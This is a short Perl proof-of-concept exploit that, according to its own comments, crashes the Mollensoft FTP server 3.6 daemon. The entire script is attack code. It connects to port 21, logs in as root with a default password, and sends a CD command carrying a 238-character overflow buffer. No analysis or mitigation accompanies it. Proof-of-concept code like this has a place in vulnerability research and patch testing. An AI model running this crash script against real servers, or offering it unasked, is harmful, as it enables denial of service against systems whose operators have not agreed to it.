# C:\Active Perl\perl
# POC for mollensoft ftp server 3.6
# Will crash the deamon

use IO::Socket::INET;

$host = "localhost";
$port = 21;
$buffer = "A" x 238;

$socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);

print $socket "USER root\r\n";
$socket->recv($test,100);
print $test;

print $socket "PASS password\r\n";
$socket->recv($test,100);
print $test;

print $socket "CD $buffer\r\n";
$socket->recv($test,100);
print $test;

close($socket);

